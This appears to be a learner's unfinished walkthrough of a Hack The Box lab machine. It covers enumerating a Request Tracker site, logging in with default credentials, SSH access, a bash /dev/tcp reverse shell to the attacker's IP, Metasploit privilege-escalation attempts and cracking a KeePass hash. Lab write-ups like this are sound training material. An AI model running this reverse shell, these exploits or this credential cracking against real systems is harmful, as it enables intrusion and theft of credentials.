target: 10.129.229.41

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)

no useful UDP ports found

website has nothing but some html on the screen:
To raise an IT support ticket, please visit tickets.keeper.htb/rt/
http://tickets.keeper.htb/rt/
Using Best practical ticketing system

Found http://tickets.keeper.htb/m/
but it seems to be a mobile version

RT/4.4.4+dfsg-2ubuntu1 is the RT version

Directory enumeration finds:
/l
/rt
/rte
/rtl
/rtf
and different file types for each path. none of these are accessible. rt/admin redirects back to login but it exists.

Wappalyzer did not find any results for this webpage

https://github.com/bestpractical/rt/releases
The RT releases shows that one of the versions close to 4.4.4 is vulnerable to timing side-channel attacks. Because
of this, I was able to enumerate the user root because it took about 30 milliseconds longer to return requests
over the other users.

Before using hydra, I tried some super basic default credentials, and with success:
root:password
root session cookie: a054dcc60425d611
These credentials worked for for the web app but not for SSH

Found a ticket with the user:
lnorgaard (Lisa Norgaard) : lnorgaard@keeper.htb
Found user creation history that shows their initial password was set to Welcome2023! 

Configuration revealed database information:
port: 3306
databaseName 'rtdb'
databaseUser 'rtuser'
databaseAdmin 'postgres'

Perl 5.34 and Apache 2.4.52 discovered

Tried adding a script but there is a CSRF protection in place that did not allow it. redirection
url brings a 404 error. Maybe a session cookie exploit would work? 

I try accessing the routes manually, but they all throw a 404 error. Not sure these functions even work.
Seems like all creation/deletion actions throw this CSRF error.

I've been trying to use ffuf to figure out if the next parameter is exploitable with LFI using the admin
session cookie, but only got a single result:

[Status: 200, Size: 4239, Words: 409, Lines: 154, Duration: 427ms]
| URL | http://tickets.keeper.htb/rt/NoAuth/Login.html?next=Copy of index.html
    * FUZZ: Copy of index.html

This didn't return anything useful. Tried multiple directory traversal attempts with the LFI as well,
but still nothing. Going to pivot and look for other vulnerabilities.

There's a scripts page where scripts can be created and ran. I was able to bypass CSRF using the redirection
url by manually typing the subdomain, but the scripts are not executing upon the actions I set.

Found out I can upload files to tickets and clicking the file launches it successfully. Going to try
uploading payloads.

Current session cookie: e8f59d857f1f803e3da935531f1df871

Didn't work when trying to access /l/ which seems to be a log storage directory location.
The directory creates a new session cookie upon every attempt. Trying to use root cookies from
/rt/ did not work to bypass the /l/ access denied restriction.

I spent hours trying to figure out why I could not exploit any entry points. I went back to HTB
and followed the "walkthrough" steps where you need to input the answers you find on your own. I noticed
the step I was on was the portion that required me to use the enumerated user's credentials to login to keeper.
But... wait a minute. I did try that. So I tried again on the website, no luck. Then, I tried SSH again,
no luck. I looked up the solution because I was desperate to just learn what I was doing wrong.
Upon reaching that part of the guide, I noticed they were able to login to this user's SSH. After some frustration,
I double checked the credentials and I realized I was typing in Welcome123! and not Welcome2023! #UserError

Now we have a successful ssh as lnorgaard and the user flag. Time to privilege escalate.
First think I noticed was a zipped file, so I extracted it:
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  RT30000.zip  user.txt

Then I ran sudo -l to see if I had sudo permissions to privilege escalate a reverse shell but I 
didn't have sudo privileges on anything. I did notice I had write/execute access to a lot of places.

I immediately setup a simple reverse shell:
sh -i >& /dev/tcp/10.10.14.238/4444 0>&1
nc -lvnp 4444

The shell executed with no friction.

I re-launched a shell using metasploit's exploit/multi/handler.

Upgraded the session with -u to meterpreter
msf6 exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1


Used this new session to download the .zip file on Lisa's desktop:
meterpreter > download RT30000.zip
[*] Downloading: RT30000.zip -> /home/cesar/RT30000.zip


Unzipped the file.
Had to install keepass to view .kdbx files.

Launching keepass and importing the db resulted in a password being requested.

Went back to analyze the KeePassDumpFull.dmp file which is a memory snapshot of
keepass:
strings KeePassDumpFull.dmp

strings KeePassDumpFull.dmp | grep -i 'password'

The more I analyzed the file the more it just looked like a giant dump of everything that the website recorded me trying.
I decided to pivot.

Ran the local exploit suggester on the meterpreter session to check for vulnerabilities:
post/multi/recon/local_exploit_suggester
 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
 2   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable
 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.

results:
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run
[*] Started reverse TCP handler on 10.10.14.238:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Linux kernel version found: 5.15.0
[*] Writing '/tmp/.qycitdwnycmk' (35592 bytes) ...
[*] Executing exploit '/tmp/.qycitdwnycmk /bin/passwd'
[*] Exploit completed, but no session was created.

No sucess. Trying the next exploit:

msf6 exploit(linux/local/glibc_tunables_priv_esc) > run
[*] Started reverse TCP handler on 10.10.14.238:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable
[+] The Build ID for ld.so: 61ef896a699bb1c2e4e231642b2e1688b2f1a61e is in the list of supported Build IDs for the exploit.
Traceback (most recent call last):
  File "<stdin>", line 290, in <module>
PermissionError: [Errno 13] Permission denied: b'"'

Another bust. Last module was another failure. No sessions created for any.

I extracted the password hash from the database using john the ripper:
┌──(cesar㉿kali)-[~]
└─$ cat keepass_hash.txt
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc

tried to crack it:

┌──(cesar㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt keepass_hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:31 2.21% (ETA: 06:25:20) 0g/s 768.3p/s 768.3c/s 768.3C/s 280384..231191
0g 0:00:01:07 4.73% (ETA: 06:25:34) 0g/s 769.4p/s 769.4c/s 769.4C/s 030278..01111961
0g 0:00:21:38 DONE (2025-03-16 06:23) 0g/s 770.2p/s 770.2c/s 770.2C/s vabatsh3..vaanes
Session completed. 

